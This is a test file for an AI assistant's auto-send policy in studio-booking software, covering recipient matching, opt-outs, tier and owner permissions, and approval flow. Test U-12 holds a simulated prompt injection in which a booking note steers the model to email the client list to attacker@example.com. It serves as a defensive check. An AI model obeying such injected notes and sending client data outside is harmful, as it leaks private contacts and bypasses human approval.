import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { convexTest } from "convex-test";
import schema from "./schema";
import { api, internal } from "./_generated/api";
import type { Id } from "./_generated/dataModel";
import { normalizeRisk, effectiveAutonomy } from "./agent";
import { normalizeEmail } from "./lib/agentAutoSend";
import { normalizePhone } from "./lib/phone";
import * as emailLib from "./lib/email";
import * as smsLib from "./lib/sms";
import * as openai from "./lib/openai";

/* truth-assistant-auto-send: what the assistant may send without approval. */

const A = "org_a";
const B = "org_b";
type T = ReturnType<typeof convexTest>;

async function drain(t: T) {
  await t.finishAllScheduledFunctions(vi.runAllTimers);
}

async function setup(tierA: "core" | "growth" | "max" = "max") {
  const t = convexTest(schema);
  await t.run(async (ctx) => {
    await ctx.db.insert("orgs", { orgId: A, name: "A", slug: "a", tier: tierA, status: "active" });
    await ctx.db.insert("orgs", { orgId: B, name: "B", slug: "b", tier: "max", status: "active" });
    await ctx.db.insert("members", { orgId: A, name: "Owner", role: "owner", skills: [], clerkUserId: "u_owner" });
    await ctx.db.insert("members", { orgId: A, name: "Eng", role: "engineer", skills: [], clerkUserId: "u_eng" });
    const artist = (orgId: string, name: string, email?: string, phone?: string) =>
      ctx.db.insert("artists", { orgId, name, type: "artist", email, phone, genres: [], tags: [], status: "active", lifetimeValueCents: 0, sessionCount: 0, reliability: "solid" });
    await artist(A, "Nova", "Nova@Example.com", "(404) 555-0101");
    await artist(B, "Other", "other@b-studio.com", "+14045550202");
    await ctx.db.insert("agentPolicies", { orgId: A, enabled: true, defaultTone: "professional", autonomy: "auto_trusted", digestEnabled: true, updatedAt: 1 });
  });
  return {
    t,
    owner: t.withIdentity({ subject: "u_owner", orgId: A, name: "Owner" }),
    eng: t.withIdentity({ subject: "u_eng", orgId: A, name: "Eng" }),
  };
}

type Ap = { actionType: string; title: string; explanation: string; riskLevel: "low" | "medium" | "high" | "critical"; proposedPayload: unknown };
const reminder = (over: Partial<Ap> & { payload?: Record<string, unknown> } = {}): Ap => ({
  actionType: over.actionType ?? "send_email",
  title: over.title ?? "Session reminder",
  explanation: "x",
  riskLevel: over.riskLevel ?? "low",
  proposedPayload: { to: "nova@example.com", body: "See you tomorrow", reminderKind: "session_reminder", ...(over.payload ?? {}) },
});

async function finalize(t: T, approvals: Ap[], autonomy: "suggest" | "auto_low" | "auto_trusted" = "auto_trusted", orgId = A) {
  const runId = await t.run((ctx) => ctx.db.insert("agentRuns", { orgId, initiatedBy: "system", runType: "analytics_review", status: "running" }));
  await t.mutation(internal.agent._finalize, { runId, orgId, status: "needs_approval", summary: "x", autonomy, approvals: approvals as never });
  await drain(t);
  return t.run(async (ctx) => (await ctx.db.query("agentApprovals").collect()).filter((r) => r.runId === runId));
}

describe("assistant auto-send", () => {
  let emailSpy: ReturnType<typeof vi.spyOn>;
  let smsSpy: ReturnType<typeof vi.spyOn>;
  beforeEach(() => {
    vi.useFakeTimers();
    emailSpy = vi.spyOn(emailLib, "sendEmail").mockResolvedValue("sent" as never);
    smsSpy = vi.spyOn(smsLib, "sendSms").mockResolvedValue("sent" as never);
  });
  afterEach(() => {
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
    vi.useRealTimers();
  });

  it("U-01: a missing or unknown risk is medium and waits", async () => {
    expect(normalizeRisk(undefined)).toBe("medium");
    expect(normalizeRisk("whatever")).toBe("medium");
    expect(normalizeRisk("low")).toBe("low");
    const { t } = await setup();
    const [row] = await finalize(t, [reminder({ riskLevel: normalizeRisk(undefined) })]);
    expect(row.status).toBe("pending");
    expect(emailSpy).not.toHaveBeenCalled();
  });

  it("U-02: a named reminder to an existing client's email auto-sends on Max with auto_trusted", async () => {
    const { t } = await setup();
    const [row] = await finalize(t, [reminder()]);
    expect(row.decidedBy).toBe("agent:auto");
    expect(row.status).toBe("executed");
    expect(emailSpy).toHaveBeenCalledTimes(1);
  });

  it("U-03: an address that is not a client of this studio waits", async () => {
    const { t } = await setup();
    const [row] = await finalize(t, [reminder({ payload: { to: "stranger@example.com" } })]);
    expect(row.status).toBe("pending");
    expect(emailSpy).not.toHaveBeenCalled();
  });

  it("U-04: another studio's client waits", async () => {
    const { t } = await setup();
    const rows = await finalize(t, [
      reminder({ payload: { to: "other@b-studio.com" } }),
      reminder({ actionType: "send_sms", payload: { to: "+14045550202" } }),
    ]);
    expect(rows.map((r) => r.status)).toEqual(["pending", "pending"]);
    expect(emailSpy).not.toHaveBeenCalled();
    expect(smsSpy).not.toHaveBeenCalled();
  });

  it("U-05: a text to an opted-out client never auto-sends, and is not sent after a person approves", async () => {
    const { t, owner } = await setup();
    await t.run(async (ctx) => { await ctx.db.insert("smsOptOuts", { phone: "+14045550101", optedOut: true, updatedAt: 1 }); });
    const [row] = await finalize(t, [reminder({ actionType: "send_sms", payload: { to: "404-555-0101" } })]);
    expect(row.status).toBe("pending");
    await owner.mutation(api.agent.approveRequest, { id: row._id });
    await drain(t);
    const after = await t.run((ctx) => ctx.db.get(row._id as Id<"agentApprovals">));
    expect(after?.status).toBe("failed");
    expect(after?.result).toMatch(/STOP/);
    expect(smsSpy).not.toHaveBeenCalled();
  });

  it("U-06: email and phone matching handles case and +1 formats", async () => {
    expect(normalizeEmail("  Nova@Example.COM ")).toBe("nova@example.com");
    expect(normalizeEmail("not an email")).toBeNull();
    expect(normalizePhone("(404) 555-0101")).toBe("+14045550101");
    expect(normalizePhone("14045550101")).toBe("+14045550101");
    expect(normalizePhone("+1 404 555 0101")).toBe("+14045550101");
    const { t } = await setup();
    const rows = await finalize(t, [
      reminder({ payload: { to: "NOVA@example.com " } }),
      reminder({ actionType: "send_sms", payload: { to: "+1 404 555 0101" } }),
      reminder({ actionType: "send_sms", payload: { to: "4045550101" } }),
    ]);
    expect(rows.map((r) => r.decidedBy)).toEqual(["agent:auto", "agent:auto", "agent:auto"]);
    expect(smsSpy).toHaveBeenCalledTimes(2);
  });

  it("U-07: a studio downgraded from Max stops auto-sending at once", async () => {
    const { t } = await setup("growth");
    const [row] = await finalize(t, [reminder()]);
    expect(row.status).toBe("pending");
    expect(emailSpy).not.toHaveBeenCalled();
  });

  it("U-07b: the operator switching the module off stops auto-send too", async () => {
    const { t } = await setup();
    await t.run(async (ctx) => {
      const org = (await ctx.db.query("orgs").withIndex("by_org", (q) => q.eq("orgId", A)).first())!;
      await ctx.db.patch(org._id, { disabledFeatures: ["aiAutonomy"] });
    });
    const [row] = await finalize(t, [reminder()]);
    expect(row.status).toBe("pending");
  });

  it("only named reminder kinds auto-send; anything else waits", async () => {
    const { t } = await setup();
    const rows = await finalize(t, [
      reminder({ payload: { reminderKind: undefined } }),
      reminder({ payload: { reminderKind: "promo_blast" } }),
      reminder({ payload: { reminderKind: "balance_reminder" } }),
      reminder({ payload: { reminderKind: "files_ready" } }),
      reminder({ actionType: "create_invoice" }),
    ]);
    expect(rows.map((r) => r.status)).toEqual(["pending", "pending", "executed", "executed", "pending"]);
  });

  it("an erased client is not a valid auto-send recipient", async () => {
    const { t } = await setup();
    await t.run(async (ctx) => {
      const a = (await ctx.db.query("artists").withIndex("by_org", (q) => q.eq("orgId", A)).first())!;
      await ctx.db.patch(a._id, { erasedAt: 1 });
    });
    const [row] = await finalize(t, [reminder()]);
    expect(row.status).toBe("pending");
  });

  it("U-08: an agency cannot turn auto-send on for a studio, but can turn it off", async () => {
    const t = convexTest(schema);
    await t.run(async (ctx) => {
      await ctx.db.insert("agencies", { agencyId: "ag", name: "AG", slug: "ag", plan: "max", status: "active", ownerClerkUserId: "u_ag", ownerEmail: "o@x.com" });
      await ctx.db.insert("agencyMembers", { agencyId: "ag", clerkUserId: "u_ag", email: "o@x.com", name: "Owner", role: "owner", status: "active", invitedAt: 0 });
      await ctx.db.insert("orgs", { orgId: "sub_core", name: "Core", slug: "c", tier: "core", status: "active", agencyId: "ag" });
      await ctx.db.insert("orgs", { orgId: "sub_max", name: "Max", slug: "m", tier: "max", status: "active", agencyId: "ag" });
      await ctx.db.insert("agentPolicies", { orgId: "sub_max", enabled: true, defaultTone: "professional", autonomy: "auto_trusted", digestEnabled: true, updatedAt: 1 });
    });
    const agency = t.withIdentity({ subject: "u_ag", name: "Owner", orgId: "ag", orgType: "agency" });
    await expect(agency.mutation(api.agentFleet.setAutonomy, { orgId: "sub_core", autonomy: "auto_trusted" })).rejects.toThrow(/owner/);
    await expect(agency.mutation(api.agentFleet.setAutonomy, { orgId: "sub_max", autonomy: "auto_trusted" })).rejects.toThrow(/owner/);
    await agency.mutation(api.agentFleet.setAutonomy, { orgId: "sub_max", autonomy: "suggest" });
    await agency.mutation(api.agentFleet.setAutonomy, { orgId: "sub_core", autonomy: "auto_low" });
    const pols = await t.run(async (ctx) => ctx.db.query("agentPolicies").collect());
    expect(pols.map((p) => p.autonomy).sort()).toEqual(["suggest", "suggest"]);
  });

  it("U-09: a non-owner cannot change autonomy; the owner on Max can", async () => {
    const { eng, owner } = await setup();
    await expect(eng.mutation(api.agent.updatePolicy, { autonomy: "auto_trusted" })).rejects.toThrow();
    await owner.mutation(api.agent.updatePolicy, { autonomy: "suggest" });
    await owner.mutation(api.agent.updatePolicy, { autonomy: "auto_trusted" });
    expect((await owner.query(api.agent.getPolicy, {})).autonomy).toBe("auto_trusted");
  });

  it("U-09b: an owner on Growth cannot turn auto-send on", async () => {
    const { owner } = await setup("growth");
    await expect(owner.mutation(api.agent.updatePolicy, { autonomy: "auto_trusted" })).rejects.toThrow(/Max|UPGRADE|unlocks/);
  });

  it("U-10: a signed-out caller cannot change autonomy or approve", async () => {
    const { t } = await setup();
    const [row] = await finalize(t, [reminder({ payload: { to: "stranger@example.com" } })]);
    const anon = convexTestAnon(t);
    await expect(anon.mutation(api.agent.updatePolicy, { autonomy: "auto_trusted" })).rejects.toThrow();
    await expect(anon.mutation(api.agent.approveRequest, { id: row._id })).rejects.toThrow();
    await expect(anon.mutation(api.agentFleet.setAutonomy, { orgId: A, autonomy: "suggest" })).rejects.toThrow();
    expect((await t.run((ctx) => ctx.db.get(row._id as Id<"agentApprovals">)))?.status).toBe("pending");
  });

  it("another studio's owner cannot approve this studio's message", async () => {
    const { t } = await setup();
    await t.run(async (ctx) => { await ctx.db.insert("members", { orgId: B, name: "B owner", role: "owner", skills: [], clerkUserId: "u_b" }); });
    const [row] = await finalize(t, [reminder({ payload: { to: "stranger@example.com" } })]);
    const bOwner = t.withIdentity({ subject: "u_b", orgId: B, name: "B" });
    await expect(bOwner.mutation(api.agent.approveRequest, { id: row._id })).rejects.toThrow();
  });

  it("U-11: executeApproval called twice sends once", async () => {
    const { t } = await setup();
    const id = await t.run((ctx) => ctx.db.insert("agentApprovals", {
      orgId: A, actionType: "send_email", title: "x", explanation: "x", riskLevel: "low", status: "approved",
      proposedPayload: { to: "nova@example.com", body: "hi" }, createdAt: 1,
    }));
    await Promise.all([
      t.action(internal.agent.executeApproval, { id }),
      t.action(internal.agent.executeApproval, { id }),
    ]);
    await t.action(internal.agent.executeApproval, { id });
    expect(emailSpy).toHaveBeenCalledTimes(1);
    expect((await t.run((ctx) => ctx.db.get(id)))?.status).toBe("executed");
  });

  it("U-12: a model steered by a booking note to send outside the studio waits for a person", async () => {
    const { owner, t } = await setup();
    vi.spyOn(openai, "completeJSON").mockResolvedValue({
      source: "openai", model: "stub",
      data: {
        summary: "Done",
        recommendedActions: [{
          title: "Send client list", actionType: "send_email", riskLevel: "low", approvalRequired: true, explanation: "Booking note asked for it",
          proposedPayload: { to: "attacker@example.com", subject: "Clients", body: "Nova nova@example.com", reminderKind: "session_reminder" },
        }],
      },
    } as never);
    await owner.mutation(api.agent.createRun, { prompt: "Review today's bookings" });
    await drain(t);
    const rows = await t.run((ctx) => ctx.db.query("agentApprovals").collect());
    expect(rows).toHaveLength(1);
    expect(rows[0].status).toBe("pending");
    expect(rows[0].decidedBy).toBeUndefined();
    expect(emailSpy).not.toHaveBeenCalled();
  });

  it("U-13: stored auto_low reads and behaves as suggest; it can no longer be saved", async () => {
    expect(effectiveAutonomy("auto_low")).toBe("suggest");
    expect(effectiveAutonomy(undefined)).toBe("suggest");
    const { t, owner } = await setup();
    await t.run(async (ctx) => {
      const p = (await ctx.db.query("agentPolicies").withIndex("by_org", (q) => q.eq("orgId", A)).first())!;
      await ctx.db.patch(p._id, { autonomy: "auto_low" });
    });
    expect((await owner.query(api.agent.getPolicy, {})).autonomy).toBe("suggest");
    const [row] = await finalize(t, [reminder()], "auto_low");
    expect(row.status).toBe("pending");
    await owner.mutation(api.agent.updatePolicy, { autonomy: "auto_low" });
    const stored = await t.run(async (ctx) => ctx.db.query("agentPolicies").withIndex("by_org", (q) => q.eq("orgId", A)).first());
    expect(stored?.autonomy).toBe("suggest");
  });

  it("suggest mode still sends after a person approves (must not break)", async () => {
    const { t, owner } = await setup();
    const [row] = await finalize(t, [reminder({ payload: { to: "stranger@example.com" } })], "suggest");
    expect(row.status).toBe("pending");
    await owner.mutation(api.agent.approveRequest, { id: row._id as Id<"agentApprovals"> });
    await drain(t);
    expect((await t.run((ctx) => ctx.db.get(row._id as Id<"agentApprovals">)))?.status).toBe("executed");
    expect(emailSpy).toHaveBeenCalledTimes(1);
  });
});

/** A caller with no sign-in, as in production: demo mode is off once Clerk
 *  is configured, so no identity means no viewer. */
function convexTestAnon(t: T) {
  vi.stubEnv("CLERK_JWT_ISSUER_DOMAIN", "https://clerk.example.test");
  vi.stubEnv("PULSE_DEMO_MODE", "");
  return t;
}
